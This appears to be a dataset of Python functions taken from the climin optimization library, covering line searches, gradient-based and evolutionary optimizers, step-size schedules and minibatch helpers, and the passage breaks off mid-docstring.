BRML/climin,armijobacktrack,"def armijobacktrack(x, t, d, f, fr, g, gtd, c1, LS, tolX, funObj):
    """"""
    Backtracking linesearch satisfying Armijo condition.

    From minFunc. Missing: doPlot, saveHessianComp, varargin
    -> varargin are passed to funObj as parameters, need to
    be put in here!!!! Hessian at initial guess is _not_ returned

    Check again with minFunc!!!

    x: starting location
    t: initial step size
    d: descent direction
    f: function value at starting location
    fr: reference function value (usually funObj(x))
    gtd: directional derivative at starting location
    c1: sufficient decrease parameter
    debug: display debugging information
    LS: type of interpolation
    tolX: minimum allowable step length
    funObj: objective function
    varargin: parameters of objective function

    Outputs:
    t: step length
    f_new: function value at x+t*d
    g_new: gradient value at x+t*d
    funEvals: number function evaluations performed by line search
    """"""
    (f_new, g_new) = funObj(x + t * d)
    funEvals = 1
    while f_new > fr + c1 * t * gtd or not isLegal(f_new):
        temp = t
        if LS == 0 or not isLegal(f_new):
            t = 0.5 * t
        elif LS == 2 and isLegal(g_new):
            (t, _) = polyinterp(np.array([[0, f, gtd], [t, f_new, np.dot(g_new, d)]]))
        elif funEvals < 2 or not isLegal(f_prev):
            (t, _) = polyinterp(np.array([[0, f, gtd], [t, f_new, 1j]]))
        else:
            (t, _) = polyinterp(np.array([[0, f, gtd], [t, f_new, 1j], [t_prev, f_prev, 1j]]))
        if t < 0.001 * temp:
            t = 0.001 * temp
        elif t > 0.6 * temp:
            t = 0.6 * temp
        f_prev = f_new
        t_prev = temp
        (f_new, g_new) = funObj(x + t * d)
        funEvals += 1
        if np.sum(np.abs(t * d)) <= tolX:
            t = 0
            f_new = f
            g_new = g
            break
    x_new = x + t * d
    return (t, x_new, f_new, g_new, funEvals)"
BRML/climin,mixedInterp,"def mixedInterp(bracket, bracketFval, bracketGval, d, Tpos, oldLOval, oldLOFval, oldLOGval):
    """"""
    From minFunc, without switches for doPlot and debug
    """"""
    nonTpos = 1 - Tpos
    gtdT = np.dot(bracketGval[Tpos], d)
    gtdNonT = np.dot(bracketGval[nonTpos], d)
    oldLOgtd = np.dot(oldLOGval, d)
    if bracketFval[Tpos] > oldLOFval:
        (alpha_c, _) = polyinterp(np.array([[oldLOval, oldLOFval, oldLOgtd], [bracket[Tpos], bracketFval[Tpos], gtdT]]))
        (alpha_q, _) = polyinterp(np.array([[oldLOval, oldLOFval, oldLOgtd], [bracket[Tpos], bracketFval[Tpos], 1j]]))
        if abs(alpha_c - oldLOval) < abs(alpha_q - oldLOval):
            t = alpha_c
        else:
            t = (alpha_q + alpha_c) / 2.0
    elif np.dot(gtdT, oldLOgtd) < 0:
        (alpha_c, _) = polyinterp(np.array([[oldLOval, oldLOFval, oldLOgtd], [bracket[Tpos], bracketFval[Tpos], gtdT]]))
        (alpha_s, _) = polyinterp(np.array([[oldLOval, oldLOFval, oldLOgtd], [bracket[Tpos], 1j, gtdT]]))
        if abs(alpha_c - bracket[Tpos]) >= abs(alpha_s - bracket[Tpos]):
            t = alpha_c
        else:
            t = alpha_s
    elif abs(gtdT) <= abs(oldLOgtd):
        (alpha_c, _) = polyinterp(np.array([[oldLOval, oldLOFval, oldLOgtd], [bracket[Tpos], bracketFval[Tpos], gtdT]]), np.min(bracket), np.max(bracket))
        (alpha_s, _) = polyinterp(np.array([[oldLOval, 1j, oldLOgtd], [bracket[Tpos], bracketFval[Tpos], gtdT]]), np.min(bracket), np.max(bracket))
        if alpha_c > min(bracket) and alpha_c < max(bracket):
            if abs(alpha_c - bracket[Tpos]) < abs(alpha_s - bracket[Tpos]):
                t = alpha_c
            else:
                t = alpha_s
        else:
            t = alpha_s
        if bracket[Tpos] > oldLOval:
            t = min(bracket[Tpos] + 0.66 * (bracket[nonTpos] - bracket[Tpos]), t)
        else:
            t = max(bracket[Tpos] + 0.66 * (bracket[nonTpos] - bracket[Tpos]), t)
    else:
        (t, _) = polyinterp(np.array([[bracket[nonTpos], bracketFval[nonTpos], gtdNonT], [bracket[Tpos], bracketFval[Tpos], gtdT]]))
    return t"
BRML/climin,wolfe_line_search,"def wolfe_line_search(x, t, d, f, g, gtd, c1, c2, LS, maxLS, tolX, funObj):
    """"""
        Bracketing Line Search to Satisfy Wolfe Conditions

        From minFunc. Missing!!! debug, doPlot, saveHessian, varargin
         Inputs:
           x: starting location
           t: initial step size
           d: descent direction
           f: function value at starting location
           g: gradient at starting location
           gtd: directional derivative at starting location
           c1: sufficient decrease parameter
           c2: curvature parameter
           debug: display debugging information
           LS: type of interpolation
           maxLS: maximum number of iterations
           tolX: minimum allowable step length
           doPlot: do a graphical display of interpolation
           funObj: objective function
           varargin: parameters of objective function

         Outputs:
           t: step length
           f_new: function value at x+t*d
           g_new: gradient value at x+t*d
           funEvals: number function evaluations performed by line search
           NOT:
           H: Hessian at initial guess (only computed if requested
        """"""
    (f_new, g_new) = funObj(x + t * d)
    funEvals = 1
    gtd_new = np.dot(g_new, d)
    LSiter = 0
    t_prev = 0
    f_prev = f
    g_prev = g
    gtd_prev = gtd
    done = False
    while LSiter < maxLS:
        if not isLegal(f_new) or not isLegal(g_new):
            t = (t + t_prev) / 2.0
            (t, x_new, f_new, g_new, _fevals) = armijobacktrack(x, t, d, f, f, g, gtd, c1, max(0, min(LS - 2, 2)), tolX, funObj)
            funEvals += _fevals
            return (t, f_new, g_new, funEvals)
        if f_new > f + c1 * t * gtd or (LSiter > 1 and f_new >= f_prev):
            bracket = [t_prev, t]
            bracketFval = [f_prev, f_new]
            bracketGval = np.array([g_prev, g_new])
            break
        elif abs(gtd_new) <= -c2 * gtd:
            bracket = np.array([t])
            bracketFval = np.array([f_new])
            bracketGval = np.array([g_new])
            done = True
            break
        elif gtd_new >= 0:
            bracket = [t_prev, t]
            bracketFval = [f_prev, f_new]
            bracketGval = np.array([g_prev, g_new])
            break
        temp = t_prev
        t_prev = t
        minStep = t + 0.01 * (t - temp)
        maxStep = t * 10
        if LS == 3:
            t = maxStep
        elif LS == 4:
            (t, _) = polyinterp(np.array([[temp, f_prev, gtd_prev], [t, f_new, gtd_new]]), minStep, maxStep)
        else:
            t = mixedExtrap(temp, f_prev, gtd_prev, t, f_new, gtd_new, minStep, maxStep)
        f_prev = f_new
        g_prev = g_new
        gtd_prev = gtd_new
        (f_new, g_new) = funObj(x + t * d)
        funEvals += 1
        gtd_new = np.inner(g_new, d)
        LSiter += 1
    if LSiter == maxLS:
        bracket = [0, t]
        bracketFval = [f, f_new]
        bracketGval = np.array([g, g_new])
    insufProgress = False
    Tpos = 1
    LOposRemoved = False
    while not done and LSiter < maxLS:
        f_LO = np.min(bracketFval)
        LOpos = np.argmin(bracketFval)
        HIpos = 1 - LOpos
        if LS == 3 or not isLegal(bracketFval) or (not isLegal(bracketGval)):
            t = np.mean(bracket)
        elif LS == 4:
            (t, _) = polyinterp(np.array([[bracket[0], bracketFval[0], np.dot(bracketGval[0], d)], [bracket[1], bracketFval[1], np.dot(bracketGval[1], d)]]))
        else:
            nonTpos = 1 - Tpos
            if not LOposRemoved:
                oldLOval = bracket[nonTpos]
                oldLOFval = bracketFval[nonTpos]
                oldLOGval = bracketGval[nonTpos]
            t = mixedInterp(bracket, bracketFval, bracketGval, d, Tpos, oldLOval, oldLOFval, oldLOGval)
        bracket_min = min(bracket)
        bracket_max = max(bracket)
        if min(bracket_max - t, t - bracket_min) / (bracket_max - bracket_min) < 0.1:
            if insufProgress or t >= np.max(bracket) or t <= np.min(bracket):
                if np.abs(t - np.max(bracket)) < np.abs(t - np.min(bracket)):
                    t = np.max(bracket) - 0.1 * (np.max(bracket) - np.min(bracket))
                else:
                    t = np.min(bracket) + 0.1 * (np.max(bracket) - np.min(bracket))
                insufProgress = False
            else:
                insufProgress = True
        else:
            insufProgress = False
        t = scipy.real(t)
        (f_new, g_new) = funObj(x + t * d)
        funEvals += 1
        gtd_new = np.dot(g_new, d)
        LSiter += 1
        if f_new > f + c1 * t * gtd or f_new >= f_LO:
            bracket[HIpos] = t
            bracketFval[HIpos] = f_new
            bracketGval[HIpos] = g_new
            Tpos = HIpos
        else:
            if np.abs(gtd_new) <= -c2 * gtd:
                done = True
            elif gtd_new * (bracket[HIpos] - bracket[LOpos]) >= 0:
                bracket[HIpos] = bracket[LOpos]
                bracketFval[HIpos] = bracketFval[LOpos]
                bracketGval[HIpos] = bracketGval[LOpos]
                if LS == 5:
                    LOposRemoved = True
                    oldLOval = bracket[LOpos]
                    oldLOFval = bracketFval[LOpos]
                    oldLOGval = bracketGval[LOpos]
            bracket[LOpos] = t
            bracketFval[LOpos] = f_new
            bracketGval[LOpos] = g_new
            Tpos = LOpos
        if not done and np.abs(bracket[0] - bracket[1]) * gtd_new < tolX:
            break
    if LSiter == maxLS:
        pass
    f_LO = np.min(bracketFval)
    LOpos = np.argmin(bracketFval)
    t = bracket[LOpos]
    f_new = bracketFval[LOpos]
    g_new = bracketGval[LOpos]
    return (t, f_new, g_new, funEvals)"
BRML/climin,__init__,"def __init__(self, wrt):
    self.wrt = wrt"
BRML/climin,search,"def search(self, direction, initialization, args=None, kwargs=None):
    raise NotImplemented()"
BRML/climin,__init__,"def __init__(self, wrt, f, decay=0.9, max_iter=float('inf'), tolerance=1e-20):
    """"""Create BackTrack object.

        Parameters
        ----------

        wrt : array_like
            Parameters over which the optimization is done.

        f : Callable
            Objective function.

        decay : float
            Factor to multiply trials for the step length with.

        max_iter : int, optional, default infinity
            Number of step lengths to try.

        tolerance : float
            Minimum absolute value of a component of the step without stopping the
            line search.
        """"""
    super(BackTrack, self).__init__(wrt)
    self.f = f
    self.max_iter = max_iter
    self.decay = decay
    self.tolerance = tolerance"
BRML/climin,search,"def search(self, direction, initialization=1, args=None, kwargs=None, loss0=None):
    """"""Return a step length ``t`` given a search direction.

        Perform the line search along a direction. Search will start at
        ``initialization`` and assume that the loss is ``loss0`` at ``t == 0``.

        Parameters
        ----------

        direction : array_like
            Has to be of the same size as .wrt. Points along that direction
            will tried out to reduce the loss.

        initialization : float
            First attempt for a step size. Will be reduced by a factor of
            ``.decay`` afterwards.

        args : list, optional, default: None
            list of optional arguments for ``.f``.

        kwargs : dictionary, optional, default: None
            list of optional keyword arguments for ``.f``.

        loss0 : float, optional
            Loss at the current parameters. Will be calculated of not given.
        """"""
    args = [] if args is None else args
    kwargs = {} if kwargs is None else kwargs
    if loss0 is None:
        loss0 = self.f(self.wrt, *args, **kwargs)
    schedule = (self.decay ** i * initialization for i in itertools.count())
    for (i, s) in enumerate(schedule):
        if i + 1 >= self.max_iter:
            break
        step = initialization * s * direction
        if abs(step).max() < self.tolerance:
            break
        candidate = self.wrt + step
        loss = self.f(candidate, *args, **kwargs)
        if -(loss0 - loss) < 0:
            return s
    return 0"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime, decay=None, c1=0.0001, c2=0.9, tolerance=1e-20):
    """"""Create StrongWolfeBackTrack object.

        Parameters
        ----------

        wrt : array_like
            Parameters over which the optimization is done.

        f : Callable
            Objective function.

        decay : float
            Factor to multiply trials for the step length with.

        tolerance : float
            Minimum absolute value of a component of the step without stopping
            the line search.
        """"""
    super(StrongWolfeBackTrack, self).__init__(wrt, f, decay, tolerance)
    self.fprime = fprime
    self.c1 = c1
    self.c2 = c2"
BRML/climin,search,"def search(self, direction, args, kwargs, loss0=None):
    if loss0 is None:
        loss0 = self.f(self.wrt, *args, **kwargs)
    self.grad = grad0 = self.fprime(self.wrt, *args, **kwargs)
    dir_dot_grad0 = scipy.inner(direction, grad0)
    for s in self.schedule:
        step = s * direction
        if abs(step.max()) < self.tolerance:
            break
        candidate = self.wrt + step
        loss = self.f(candidate, *args, **kwargs)
        if loss <= loss0 + self.c1 * s * dir_dot_grad0:
            grad = self.fprime(candidate, *args, **kwargs)
            dir_dot_grad = scipy.inner(direction, grad)
            if abs(dir_dot_grad) <= self.c2 * abs(dir_dot_grad0):
                self.grad = grad
                return s
    return 0.0"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime):
    super(ScipyLineSearch, self).__init__(wrt)
    self.f = f
    self.fprime = fprime"
BRML/climin,search,"def search(self, direction, args, kwargs):
    if kwargs:
        raise ValueError('keyword arguments not supported')
    gfk = self.fprime(self.wrt, *args)
    return scipy.optimize.line_search(self.f, self.fprime, self.wrt, direction, gfk, args=args)[0]"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime, c1=0.0001, c2=0.9, maxiter=25, min_step_length=1e-09, typ=4):
    super(WolfeLineSearch, self).__init__(wrt)
    self.f = f
    self.fprime = fprime
    self.c1 = c1
    self.c2 = c2
    self.maxiter = maxiter
    self.min_step_length = min_step_length
    self.typ = typ
    self.first_try = True"
BRML/climin,search,"def search(self, direction, initialization=None, args=None, kwargs=None, loss0=None):
    args = args if args is not None else ()
    kwargs = kwargs if kwargs is not None else {}
    loss0 = self.f(self.wrt, *args, **kwargs) if loss0 is None else loss0
    grad0 = self.fprime(self.wrt, *args, **kwargs)
    direct_deriv0 = scipy.inner(grad0, direction)
    f = lambda x: (self.f(x, *args, **kwargs), self.fprime(x, *args, **kwargs))
    if self.first_try:
        self.first_try = False
        t = min(1, 1 / sum(abs(grad0)))
    else:
        t = initialization if initialization is not None else 1
    (step, fstep, fprimestep, n_evals) = wolfe_line_search(self.wrt, t, direction, loss0, grad0, direct_deriv0, self.c1, self.c2, self.typ, self.maxiter, self.min_step_length, f)
    self.val = fstep
    self.grad = fprimestep
    return step"
BRML/climin,sqrt,"def sqrt(x):
    """"""Return an array of the same shape containing the element square
    root of `x`.""""""
    return x ** 0.5"
BRML/climin,zero_like,"def zero_like(x):
    """"""Return an array of the same shape as `x` containing only zeros.""""""
    return x * 0.0"
BRML/climin,ones_like,"def ones_like(x):
    """"""Return an array of the same shape as `x` containing only ones.""""""
    return x * 0.0 + 1.0"
BRML/climin,clip,"def clip(a, a_min, a_max):
    """"""Clip (limit) the values in an array.

    Given an interval, values outside the interval are clipped to the interval
    edges. For example, if an interval of [0, 1] is specified, values smaller
    than 0 become 0, and values larger than 1 become 1.""""""
    if not isinstance(a, np.ndarray):
        max_mask = a > a_max
        max_tar = gp.ones(a.shape) * a_max
        min_mask = a < a_min
        min_tar = gp.ones(a.shape) * a_min
        a_clipped = a * (1 - max_mask - min_mask) + max_tar * max_mask + min_tar * min_mask
        return a_clipped
    else:
        return np.clip(a, a_min, a_max)"
BRML/climin,sign,"def sign(x):
    """"""Returns an element-wise indication of the sign of a number.""""""
    if not isinstance(x, np.ndarray):
        return gp.sign(x)
    else:
        return np.sign(x)"
BRML/climin,where,"def where(x, *args):
    """"""Delegate to gnumpy.where or numpy.where depending on the type of `x`.""""""
    if not isinstance(x, np.ndarray):
        return gp.where(x, *args)
    else:
        return np.where(x, *args)"
BRML/climin,random_like,"def random_like(x):
    """"""Return an array of the same shape as `x` filled with random numbers from
    the interval [0, 1).""""""
    if not isinstance(x, np.ndarray):
        return gp.rand(x.shape)
    else:
        return np.random.random(x.shape)"
BRML/climin,random_normal_like,"def random_normal_like(x, loc, scale):
    """"""Return an array of the same shape as `x` filled with random numbers from
    the interval [0, 1).""""""
    if not isinstance(x, np.ndarray):
        return gp.randn(*x.shape) * scale + loc
    else:
        return np.random.normal(loc, scale, x.shape)"
BRML/climin,assert_numpy,"def assert_numpy(x):
    """"""Given a gnumpy or numpy array x, return an array with the same contents.""""""
    if not isinstance(x, np.ndarray):
        x = x.as_numpy_array()
    else:
        x = x.copy()
    return x"
BRML/climin,scalar,"def scalar(x):
    if isinstance(x, float):
        return x
    if not x.size == 1:
        raise ValueError('size is %i instead of 1' % x.size)
    return x.reshape((1,))[0]"
BRML/climin,isnan,"def isnan(x):
    """"""Delegate to gnumpy.isnan or numpy.isnan depending on the type of `x`.""""""
    if not isinstance(x, np.ndarray):
        return gp.isnan(x)
    else:
        return np.isnan(x)"
BRML/climin,__init__,"def __init__(self, wrt, f, args=None):
    super(Xnes, self).__init__(wrt, args=args)
    self._f = f
    dim = self.wrt.shape[0]
    log_dim = scipy.log(dim)
    self.step_rate = 0.6 * (3 + log_dim) / dim / scipy.sqrt(dim)
    self.batch_size = 4 + int(scipy.floor(3 * log_dim))"
BRML/climin,set_from_info,"def set_from_info(self, info):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,extended_info,"def extended_info(self, **kwargs):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,f,"def f(self, x, *args, **kwargs):
    return -self._f(x, *args, **kwargs)"
BRML/climin,__iter__,"def __iter__(self):
    dim = self.wrt.shape[0]
    I = scipy.eye(dim)
    A = scipy.eye(dim)
    center = self.wrt.copy()
    n_evals = 0
    best_wrt = None
    best_x = float('-inf')
    for (i, (args, kwargs)) in enumerate(self.args):
        samples = scipy.random.standard_normal((self.batch_size, dim))
        samples = scipy.dot(samples, A) + center
        fitnesses = [self.f(samples[j], *args, **kwargs) for j in range(samples.shape[0])]
        fitnesses = scipy.array(fitnesses).flatten()
        if fitnesses.max() > best_x:
            best_loss = fitnesses.max()
            self.wrt[:] = samples[fitnesses.argmax()]
        utilities = self.compute_utilities(fitnesses)
        center += scipy.dot(scipy.dot(utilities, samples), A)
        cov_gradient = sum([u * (scipy.outer(s, s) - I) for (s, u) in zip(samples, utilities)])
        update = scipy.linalg.expm2(A * cov_gradient * self.step_rate * 0.5)
        A[:] = scipy.dot(A, update)
        yield dict(loss=-best_x, n_iter=i)"
BRML/climin,compute_utilities,"def compute_utilities(self, fitnesses):
    n_fitnesses = fitnesses.shape[0]
    ranks = scipy.zeros_like(fitnesses)
    l = sorted(enumerate(fitnesses), key=lambda x: x[1])
    for (i, (j, _)) in enumerate(l):
        ranks[j] = i
    utilities = -scipy.log((n_fitnesses - ranks).astype('float64'))
    utilities += scipy.log(n_fitnesses / 2.0 + 1.0)
    utilities = scipy.clip(utilities, 0, float('inf'))
    utilities /= utilities.sum()
    utilities -= 1.0 / n_fitnesses
    return utilities"
BRML/climin,max_length_columns,"def max_length_columns(arr, max_length):
    """"""Project the columns of an array below a certain length.

    Works in place.

    Parameters
    ----------

    arr : array_like
        2D array.

    max_length : int
        Maximum length of a column.
    """"""
    if arr.ndim != 2:
        raise ValueError('only 2d arrays allowed')
    max_length = float(max_length)
    lengths = sqrt((arr ** 2).sum(axis=0))
    too_big_by = lengths / max_length
    divisor = too_big_by
    non_violated = lengths < max_length
    if isinstance(arr, np.ndarray):
        divisor[np.where(non_violated)] = 1.0
    else:
        for (i, nv) in enumerate(non_violated):
            if nv:
                divisor[i] = 1.0
    arr /= divisor[np.newaxis]"
BRML/climin,step_rate,"@property
def step_rate(self):
    return self._step_rate"
BRML/climin,step_rate,"@step_rate.setter
def step_rate(self, value):
    self._step_rate = value
    if self.step_adapt:
        self._step_rate *= ones_like(self.wrt)"
BRML/climin,__init__,"def __init__(self, wrt, fprime, step_rate, decay=0.9, momentum=0, step_adapt=False, step_rate_min=0, step_rate_max=np.inf, args=None):
    """"""Create an RmsProp object.

        Parameters
        ----------

        wrt : array_like
            Array that represents the solution. Will be operated upon in
            place.  ``fprime`` should accept this array as a first argument.

        fprime : callable
            Callable that given a solution vector as first parameter and *args
            and **kwargs drawn from the iterations ``args`` returns a
            search direction, such as a gradient.

        step_rate : float or array_like
            Step rate to use during optimization. Can be given as a single
            scalar value or as an array for a different step rate of each
            parameter of the problem.

        decay : float
            Decay parameter for the moving average. Must lie in [0, 1) where
            lower numbers means a shorter ""memory"".

        momentum : float or array_like
          Momentum to use during optimization. Can be specified analoguously
          (but independent of) step rate.

        step_adapt : float or bool
            Constant to adapt step rates. If False, step rate adaption is not done.

        step_rate_min : float, optional, default 0
            When adapting step rates, do not move below this value.

        step_rate_max : float, optional, default inf
            When adapting step rates, do not move above this value.

        args : iterable
            Iterator over arguments which ``fprime`` will be called with.
        """"""
    super(RmsProp, self).__init__(wrt, args=args)
    self.fprime = fprime
    self.decay = decay
    self.momentum = momentum
    self.step_adapt = step_adapt
    self.step_rate_min = step_rate_min
    self.step_rate_max = step_rate_max
    self.step_rate = step_rate
    self.moving_mean_squared = 1
    self.step = 0"
BRML/climin,_iterate,"def _iterate(self):
    for (args, kwargs) in self.args:
        step_m1 = self.step
        step1 = step_m1 * self.momentum
        self.wrt -= step1
        gradient = self.fprime(self.wrt, *args, **kwargs)
        self.moving_mean_squared = self.decay * self.moving_mean_squared + (1 - self.decay) * gradient ** 2
        step2 = self.step_rate * gradient
        step2 /= sqrt(self.moving_mean_squared + 1e-08)
        self.wrt -= step2
        step = step1 + step2
        if self.step_adapt:
            step_non_negative = step > 0
            step_m1_non_negative = step_m1 > 0
            agree = (step_non_negative == step_m1_non_negative) * 1.0
            adapt = 1 + agree * self.step_adapt * 2 - self.step_adapt
            self.step_rate *= adapt
            self.step_rate = clip(self.step_rate, self.step_rate_min, self.step_rate_max)
        self.step = step
        self.n_iter += 1
        yield dict(gradient=gradient, args=args, kwargs=kwargs)"
BRML/climin,__init__,"def __init__(self, wrt, fprime, step_shrink=0.5, step_grow=1.2, min_step=1e-06, max_step=1, changes_max=0.1, args=None):
    """"""Create an Rprop object.

        Parameters
        ----------

        wrt : array_like
            Current solution to the problem. Can be given as a first argument
            to ``.fprime``.

        fprime : Callable
            First derivative of the objective function. Returns an array of the
            same shape as ``.wrt``.

        step_shrink : float
            Constant to shrink step rates by if the gradients of the error do
            not agree over time.

        step_grow : float
            Constant to grow step rates by if the gradients of the error do
            agree over time.

        min_step : float
            Minimum step rate.

        max_step : float
            Maximum step rate.

        args : iterable
            Iterator over arguments which ``fprime`` will be called with.
        """"""
    super(Rprop, self).__init__(wrt, args=args)
    self.fprime = fprime
    self.step_shrink = step_shrink
    self.step_grow = step_grow
    self.min_step = min_step
    self.max_step = max_step
    self.changes_max = changes_max
    self.gradient = ma.zero_like(self.wrt)
    self.changes = ma.zero_like(self.wrt)"
BRML/climin,_iterate,"def _iterate(self):
    for (args, kwargs) in self.args:
        gradient_m1 = self.gradient
        self.gradient = self.fprime(self.wrt, *args, **kwargs)
        gradprod = gradient_m1 * self.gradient
        self.changes[gradprod > 0] *= self.step_grow
        self.changes[gradprod < 0] *= self.step_shrink
        self.changes = ma.clip(self.changes, self.min_step, self.max_step)
        step = -self.changes * ma.sign(self.gradient)
        self.wrt += step
        self.n_iter += 1
        yield {'args': args, 'kwargs': kwargs, 'step': step}"
BRML/climin,decaying,"def decaying(start, decay):
    """"""Return an iterator of exponentially decaying values.

    The first value is ``start``. Every further value is obtained by multiplying
    the last one by a factor of ``decay``.

    Examples
    --------

    >>> from climin.schedule import decaying
    >>> s = decaying(10, .9)
    >>> [next(s) for i in range(5)]
    [10.0, 9.0, 8.100000000000001, 7.290000000000001, 6.561]
    """"""
    return (start * decay ** i for i in itertools.count(0))"
BRML/climin,linear_annealing,"def linear_annealing(start, stop, n_steps):
    """"""Return an iterator that anneals linearly to a point linearly.

    The first value is ``start``, the last value is ``stop``. The annealing will
    be linear over ``n_steps`` iterations. After that, ``stop`` is yielded.

    Examples
    --------

    >>> from climin.schedule import linear_annealing
    >>> s = linear_annealing(1, 0, 4)
    >>> [next(s) for i in range(10)]
    [1.0, 0.75, 0.5, 0.25, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0]
    """"""
    (start, stop) = (float(start), float(stop))
    inc = (stop - start) / n_steps
    for i in range(n_steps):
        yield (start + i * inc)
    while True:
        yield stop"
BRML/climin,repeater,"def repeater(iter, n):
    """"""Return an iterator that repeats each element of `iter` exactly
    `n` times before moving on to the next element.

    Examples
    --------

    >>> from climin.schedule import repeater
    >>> s = repeater([1, 2, 3], 2)
    >>> [next(s) for i in range(6)]
    [1, 1, 2, 2, 3, 3]
    """"""
    for i in iter:
        for j in range(n):
            yield i"
BRML/climin,__init__,"def __init__(self, max_momentum, stretch=250):
    self.max_momentum = max_momentum
    self.stretch = stretch"
BRML/climin,__iter__,"def __iter__(self):
    for i in itertools.count(1):
        m = 1 - 2 ** (-1 - math.log(np.floor_divide(i, self.stretch) + 1, 2))
        yield min(m, self.max_momentum)"
BRML/climin,__init__,"def __init__(self, wrt, f, fprime, f_Hp, lmbd=0.99, mu=0.02, eta0=5e-05, args=None):
    super(Smd, self).__init__(wrt, args=args)
    self.f = f
    self.fprime = fprime
    self.f_Hp = f_Hp
    self.lmbd = lmbd
    self.mu = mu
    self.eta0 = eta0"
BRML/climin,set_from_info,"def set_from_info(self, info):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,extended_info,"def extended_info(self, **kwargs):
    raise NotImplemented('nobody has found the time to implement this yet')"
BRML/climin,__iter__,"def __iter__(self):
    p = np.size(self.wrt)
    v = 0.0001 * np.random.randn(p)
    eta = self.eta0 * np.ones(p)
    for (i, (args, kwargs)) in enumerate(self.args):
        gradient = self.fprime(self.wrt, *args, **kwargs)
        if not is_nonzerofinite(gradient):
            warnings.warn('gradient is either zero, nan or inf')
            break
        Hp = self.f_Hp(self.wrt, v, *args, **kwargs)
        eta = eta * np.maximum(0.5, 1 + self.mu * v * gradient)
        v *= self.lmbd
        v += eta * (gradient - self.lmbd * Hp)
        self.wrt -= eta * gradient
        yield {'n_iter': i, 'args': args, 'kwargs': kwargs, 'gradient': gradient, 'v': v, 'eta': eta}"
BRML/climin,is_garray,"def is_garray(cand):
    return hasattr(cand, 'as_numpy_array')"
BRML/climin,is_array,"def is_array(cand):
    return is_garray(cand) or isinstance(cand, np.ndarray)"
BRML/climin,clear_info,"def clear_info(info):
    """"""Clean up contents of info dictionary for better use.

    Keys to be removed are ``args``, ``kwargs`` and any non-scalar numpy or
    gnumpy arrays. Numpy scalars are converted to floats.

    Examples
    --------

    >>> import numpy as np
    >>> info = {'args': None, 'foo': np.zeros(3), 'bar': np.array(1),
    ...         'loss': 1.}
    >>> cleared = clear_info(info)
    >>> cleared == {'bar': 1.0, 'loss': 1.0}
    True
    """"""
    items = info.iteritems()
    items = ((k, float(v.reshape((1,))[0]) if is_array(v) and v.size == 1 else v) for (k, v) in items)
    items = ((k, v) for (k, v) in items if not is_array(v))
    items = ((k, v) for (k, v) in items if k not in ('args', 'kwargs'))
    return dict(items)"
BRML/climin,coroutine,"def coroutine(f):
    """"""Turn a generator function into a coroutine by calling .next() once.""""""

    def started(*args, **kwargs):
        cr = f(*args, **kwargs)
        next(cr)
        return cr
    return started"
BRML/climin,aslist,"def aslist(item):
    if not isinstance(item, (list, tuple)):
        item = [item]
    return item"
BRML/climin,mini_slices,"def mini_slices(n_samples, batch_size):
    """"""Yield slices of size `batch_size` that work with a container of length
    `n_samples`.""""""
    (n_batches, rest) = divmod(n_samples, batch_size)
    if rest != 0:
        n_batches += 1
    return [slice(i * batch_size, (i + 1) * batch_size) for i in range(n_batches)]"
BRML/climin,draw_mini_slices,"def draw_mini_slices(n_samples, batch_size, with_replacement=False):
    slices = mini_slices(n_samples, batch_size)
    idxs = list(range(len(slices)))
    if with_replacement:
        yield random.choice(slices)
    else:
        while True:
            random.shuffle(idxs)
            for i in idxs:
                yield slices[i]"
BRML/climin,draw_mini_indices,"def draw_mini_indices(n_samples, batch_size):
    assert n_samples > batch_size
    idxs = list(range(n_samples))
    random.shuffle(idxs)
    pos = 0
    while True:
        while pos + batch_size <= n_samples:
            yield idxs[pos:pos + batch_size]
            pos += batch_size
        batch = idxs[pos:]
        needed = batch_size - len(batch)
        random.shuffle(idxs)
        batch += idxs[0:needed]
        yield batch
        pos = needed"
BRML/climin,optimizer,"def optimizer(identifier, wrt, *args, **kwargs):
    """"""Return an optimizer with the desired configuration.

    This is a convenience function if one wants to try out different optimizers
    but wants to change as little code as possible.

    Additional arguments and keyword arguments will be passed to the constructor
    of the class. If the found class does not take the arguments supplied, this
    will `not` throw an error, but pass silently.

    :param identifier: String identifying the optimizer to use. Can be either
        ``asgd``, ``gd``, ``lbfgs``, ``ncg``, ``rprop``, ``adadelta`` or
        ``smd``.
    :param wrt: Numpy array pointing to the data to optimize.
    """"""
    klass_map = {'gd': GradientDescent, 'lbfgs': Lbfgs, 'ncg': NonlinearConjugateGradient, 'rprop': Rprop, 'rmsprop': RmsProp, 'adadelta': Adadelta, 'adam': Adam}
    klass = klass_map[identifier]
    argspec = inspect.getargspec(klass.__init__)
    if argspec.keywords is None:
        expected_keys = set(argspec.args)
        given_keys = set(kwargs.keys())
        unused_keys = given_keys - expected_keys
        for i in unused_keys:
            warnings.warn('Argument named %s is not expected by %s' % (i, klass))
        used_keys = expected_keys & given_keys
        kwargs = dict(((k, kwargs[k]) for k in used_keys))
    try:
        opt = klass(wrt, *args, **kwargs)
    except TypeError:
        raise TypeError('required arguments for %s: %s' % (klass, argspec.args))
    return opt"
BRML/climin,shaped_from_flat,"def shaped_from_flat(flat, shapes):
    """"""Given a one dimensional array ``flat``, return a list of views of shapes
    ``shapes`` on that array.

    Each view will point to a distinct memory region, consecutively allocated
    in flat.

    Parameters
    ----------

    flat : array_like
        Array of one dimension.

    shapes : list of tuples of ints
        Each entry of this list specifies the shape of the corresponding view
        into ``flat``.

    Returns
    -------

    views : list of arrays
        Each entry has the shape given in ``shapes`` and points as a view into
        ``flat``.
    """"""
    shapes = [(i,) if isinstance(i, int) else i for i in shapes]
    sizes = [np.prod(i) for i in shapes]
    n_used = 0
    views = []
    for (size, shape) in zip(sizes, shapes):
        this = flat[n_used:n_used + size]
        n_used += size
        this.shape = shape
        views.append(this)
    return views"
BRML/climin,empty_with_views,"def empty_with_views(shapes, empty_func=np.empty):
    """"""Create an array and views shaped according to ``shapes``.

    The ``shapes`` parameter is a list of tuples of ints.  Each tuple
    represents a desired shape for an array which will be allocated in a bigger
    memory region. This memory region will be represented by an array as well.

    For example, the shape speciciation ``[2, (3, 2)]`` will create an array
    ``flat`` of size 8. The first view will have a size of ``(2,)`` and point
    to the first two entries, i.e. ``flat`[:2]`, while the second array will
